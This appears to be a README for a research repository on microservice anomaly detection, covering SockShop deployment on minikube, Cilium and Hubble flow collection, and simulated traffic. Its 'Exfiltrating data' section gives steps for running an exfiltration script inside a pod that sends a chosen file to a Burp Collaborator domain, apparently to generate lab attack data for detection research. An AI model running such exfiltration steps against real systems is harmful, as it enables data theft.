# Microservice Anomaly Detection
Brian: I want this repository to become the central repository for all things microservice related.
It is a mess and we need to cleanup the whole repository

## Deploying SockShop
1. Optional: Install minikube
2. Optional: Set minikube config to have enough memory and cpu (sets default)
   1. `minikube config set memory 16384`
   2. `minikube config set cpus 10`
3. Create a profile for your cluster: `minikube profile CLUSTER_NAME`
4. Start minikube: `minikube start --cni=cilium -p CLUSTER_NAME --memory 8192 --cpus 4`
5. Deploy SockShop: `bash deploy_sockshop.sh`

Check status of pods: `kubectl get pods --namespace sock-shop`

Get IP of front-end service: `minikube service --profile CLUSTER_NAME --url front-end -n sock-shop` 

Test if it is working `curl http://192.168.49.2:30001` or go to link in browser

## Debugging cilium connectivity 
1. Follow the guide for first time : https://kubernetes.io/docs/tasks/administer-cluster/network-policy-provider/cilium-network-policy/
2. Use https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/ to run tests : cilium connectivity test and cilium status --wait to verify outputs match.

## Simulating Traffic on SockShop
1. cd into `experiment_coordinator`
2. Setup a conda environment: `conda env create -f condaEnv.yml`
3. Cd into `traffic_simulation`
4. Activate conda env: `conda activate sockShop`
If you need to populate the database full of users: `python simulate_traffic.py -p`
4. Simulate traffic: `python simulate_traffic.py -t`

## Collecting Data with Cilium
1. To deploy cilium: `bash deploy_cilium.sh`
2. Test if its working: `cilium connectivity test`
3. Check if hubble is collecting flows : `hubble status`
4. To start collecting `hubble observe -n sock-shop -o json`

Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/

----

## Deployment Instructions[Cryptk8s]

### Initial deployment
1. To cleanup minikube: `bash cleanup.sh`
2. To deploy minikube cluster with cilium and sockshop: `bash initiate.sh`
3. To deploy cilium with hubble: `bash deploy_cilium.sh`
4. Check the status of the cluster with `bash check_pods.sh`
5. Getting the IP of the front-end pod: `bash get_ip.sh`


### Exfiltrating data
1. Get into front end pod using `bash to_front.sh`
2. Once inside front end pod, execute `cd /tmp`
3. Write contents of attack script onto the pod using command `cat >exfil.sh` and pasting contents
4. Make the file executable by running `chmod +x exfil.sh`
5. Setup Burp Collaborator and copy domain name
6. Run exfil.sh with arguments: `./exfil.sh FILE_TO_BE_EXFILTRATED DOMAIN_NAME_FROM_BURP`
7. Repeat steps 3 to 6 with script tchan.sh for timing channel exfiltration

### Collecting data through hubble
1. Follow steps in `Collecting Data with Cilium`
2. Run command `bash observe_net.sh`

### TODO
1. Check hubble data collection
2. Lateral movement
3. Cryptojacking attack
